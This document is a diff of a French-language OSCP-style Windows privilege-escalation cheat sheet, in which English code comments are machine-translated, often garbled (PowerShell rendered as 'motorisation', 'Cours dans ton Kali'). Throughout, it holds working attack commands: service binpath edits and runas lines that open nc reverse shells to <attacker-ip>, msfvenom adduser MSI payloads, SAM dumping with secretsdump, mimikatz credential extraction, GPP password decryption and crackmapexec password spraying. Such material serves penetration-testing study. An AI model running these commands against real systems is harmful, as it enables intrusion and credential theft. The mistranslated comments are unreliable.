@@ -8,7 +8,7 @@ description: "Organiser les vérifications et la collecte des résultats."
 Organiser les vérifications et la collecte des résultats.
 
 
-### Scan initial
+### Numérisation initiale
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -184,7 +184,7 @@ pwd
 Examiner les entrées et les réponses de l'application web.
 
 
-### Scan initial
+### Numérisation initiale
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -384,7 +384,7 @@ echo $PATH
 ```
 
 
-#### Services et tâches planifiées
+#### Services et tâches prévues
 
 
 **Paramètres et repères :**
@@ -527,8 +527,8 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 
 ```bash
-# List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
-# to cross compile a program from Kali
+# Liste des exploits du noyau https://github.com/SecWiki/windows-kernel-exploits
+# pour compiler un programme à partir de Kali
 $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
 ```
 
@@ -619,17 +619,17 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 <p class="oscp-command-note">Examiner les services Windows.</p>
 
 ```powershell
-# using sc
+# utilisant sc
 sc qc <service_name>
 
-# using accesschk.exe
+# utilisant accesschk.exe
 accesschk.exe -ucqv <Service_Name>
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv %USERNAME% * /accepteula
 accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
 accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
-# using msf
+# utilisant msf
 exploit/windows/local/service_permissions
 ```
 
@@ -646,21 +646,21 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 <p class="oscp-command-note">Examiner les services Windows.</p>
 
 ```powershell
-# if the group "Authenticated users" has SERVICE_ALL_ACCESS
-# it can modify the binary path
+# si le groupe "Utilisateurs agréés" a SERVICE_ALL_ACCESS
+# il peut modifier le chemin binaire
 # bind shell
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 
 # reverse shell
 sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe <attacker-ip> 4444 -e cmd.exe"
 
-# add user to local admin group
+# ajouter utilisateur au groupe d'administration local
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
 
-# example using SSDPRV
+# exemple utilisant SSDPRV
 sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
 
-# then restart the service
+# puis redémarrez le service
 wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]
 ```
@@ -688,8 +688,8 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 
-# if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
-# it can be leveraged to change the binary path inside the registry
+# si les utilisateurs authentifiés ou NT AUTHORITY\INTERACTIVE ont FullControl
+# il peut être utilisé pour modifier le chemin binaire à l'intérieur du registre
 reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
 
@@ -709,23 +709,23 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Misconfigurations ».</p>
 
 ```powershell
-# using accesschk.exe
+# utilisant accesschk.exe
 accesschk.exe /accepteula
-# Find all weak folder permissions per drive.
+# Trouver toutes les permissions de dossier faibles par lecteur.
 accesschk.exe -uwdqs Users c:\
 accesschk.exe -uwdqs "Authenticated Users" c:\
 accesschk.exe -uwdqs "Everyone" c:\
 
-# Find all weak file permissions per drive.
+# Trouver toutes les permissions de fichiers faibles par lecteur.
 accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs "Authenticated Users" c:\*.*
 accesschk.exe -uwdqs "Everyone" c:\*.*
 
-# using icacls
+# utilisant des icacls
 icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
 icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
 
-# using Powershell
+# utilisant Powershell
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
 
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
@@ -744,21 +744,21 @@ for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F
 <p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
 
 ```powershell
-# if both are enabled (set to 0x1), it's possible to execute
+# si les deux sont activés (réglage à 0x1), il est possible d'exécuter
 # any .msi as NT AUTHORITY\SYSTEM
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
-# check with msf
+# vérifier avec msf
 exploit/windows/local/always_install_elevated
 
 # generate payload with msfvenom
-# no uac format
+# pas de format uac
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
-# using the msiexec the uac wont be prompted
+# en utilisant le msiexec l'uac ne sera pas invité
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
 
-# install .msi
+# installer .msi
 msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
 ```
 
@@ -766,14 +766,14 @@ msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
 <p class="oscp-command-note">Examiner les tâches planifiées Windows.</p>
 
 ```powershell
-# using schtasks
+# utilisant des schtasks
 schtasks /query /fo LIST /v
-# filtering the output
+# filtrage de la sortie
 schtasks /query /fo LIST /v | findstr /v "\Microsoft"
 
-# using powershell
+# utilisant une motorisation
 Get-ScheduledTask | ft TaskName,TaskPath,State
-# filtering the output
+# filtrage de la sortie
 Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
@@ -796,7 +796,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-command-note">Exécuter un script PowerShell.</p>
 
 ```powershell
-# Using powershell
+# Utilisation de la motorisation
 powershell.exe Start-Process cmd.exe -Verb runAs
 ```
 
@@ -804,7 +804,7 @@ powershell.exe Start-Process cmd.exe -Verb runAs
 
 
 ```powershell
-# Check also with runas
+# Vérifiez également avec les runas
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
 
@@ -821,7 +821,7 @@ findstr /si /m password *.xml *.ini *.txt
 
 ```powershell
 cmdkey /list
-# if found
+# s'il est trouvé
 runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
 ```
 
@@ -835,7 +835,7 @@ reg query HKCU /f pass /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
-# Windows Autologin
+# Autologin Windows
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
@@ -1018,7 +1018,7 @@ Get-Content -path <filename> -Stream <keyword>
 
 
 ```powershell
-# From user home
+# De la maison de l'utilisateur
 .aws\credentials
 AppData\Roaming\gcloud\credentials.db
 AppData\Roaming\gcloud\legacy_credentials
@@ -1031,9 +1031,9 @@ AppData\Roaming\gcloud\access_tokens.db
 
 
 ```powershell
-# Before Vista look inside
+# Avant que Vista regarde à l'intérieur
 C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
-# After Vista look inside
+# Après Vista regarder à l'intérieur
 C:\ProgramData\Microsoft\Group Policy\history
 # Look for
 Groups.xml
@@ -1043,7 +1043,7 @@ DataSources.xml
 Printers.xml
 Drives.xml
 
-# Decrypt the passwords with
+# Décrypter les mots de passe avec
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
 
@@ -1071,7 +1071,7 @@ Remote desktop credential manager
 
 
 ```powershell
-# Check if the retrieved sotfwares are vulnerable to DLL Sideloading
+# Vérifiez si les sotfwares récupérés sont vulnérables au chargement latéral DLL
 # https://github.com/enjoiz/Privesc
 $result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
@@ -1124,7 +1124,7 @@ sc query state= all | findstr "SERVICE_NAME"
 <p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```powershell
-# Look for them in C:\\ProgramData, C:\\Users\\All Users, and application-specific folders like C:\\Program Files.
+# Recherchez-les dans C:\\ProgramData, C:\\Users\\Tous les utilisateurs et les dossiers spécifiques à une application comme C:\\Program Files.
 
 dir /s /b C:\\Users\\Public\\*.config
 ```
@@ -1137,11 +1137,11 @@ dir /s /b C:\\Users\\Public\\*.config
 <p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
 ```bash
-# Run in Windows
+# Exécuter dans Windows
 reg save HKLM\\SAM sam.save
 reg save HKLM\\SYSTEM system.save
 
-# Run in your Kali
+# Cours dans ton Kali
 impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
 ```
 
@@ -1190,10 +1190,10 @@ impacket-wmiexec <username>:<password>@<target_ip>
 <p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```powershell
-# Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
+# Vérifiez le mot de passe cpass dans le partage SYSvol pour obtenir des mots de passe clairs dans les fichiers XML.
 dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword
 
-# Look for Groups.xml files which might contain cleartext passwords.
+# Recherchez les fichiers Groups.xml qui peuvent contenir des mots de passe clairs.
 smbclient //dc-ip/SYSVOL -U "domain\username"
 ```
 
@@ -1226,19 +1226,19 @@ schtasks /query /fo LIST /v
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```powershell
-# Test for WinRM
+# Essai pour WinRM
 crackmapexec winrm [domain_ip] -u [user_list].txt -p [found_passwords].txt --continue-on-success -d [subdomain.domain.com]
 crackmapexec winrm [domain_ip] -u [user_list].txt -H [found_ntlm_hashes].txt --continue-on-success -d [subdomain.domain.com]
 
-# Test for PsExec
+# Essai pour PsExec
 crackmapexec smb [ip]  -u [user_list].txt -p [found_passwords].txt -d [subdomain.domain.com] --continue-on-success
 crackmapexec smb [ip]  -u [user_list].txt -H [found_ntlm_hashes].txt -d [subdomain.domain.com] --continue-on-success
 
-# Check if can find something else in the SMB
+# Vérifiez si vous pouvez trouver autre chose dans le SMB
 impacket-smbclient [user]:[password]@[ip]
 impacket-smbclient [user]@[ip] -hashes 00000000000000000000000000000000:[valid_ntlm_hash]
 
-# Test any other possible service or interesting thing you have found agains the subdomains
+# Tester tout autre service possible ou chose intéressante que vous avez trouvé à nouveau les sous-domaines
 ```
 
 
@@ -1311,11 +1311,7 @@ mimikatz # sekurlsa::logonPasswords
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\\Users\\Public</code></p>
 
 
-```text
-C:\\Users\\[Administrator/any_user]\\Desktop
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\\Users\\[Administrator/any_user]\\Desktop</code></p>
 <p class="oscp-command-note">Afficher le nom de la machine.</p>
 
 ```powershell
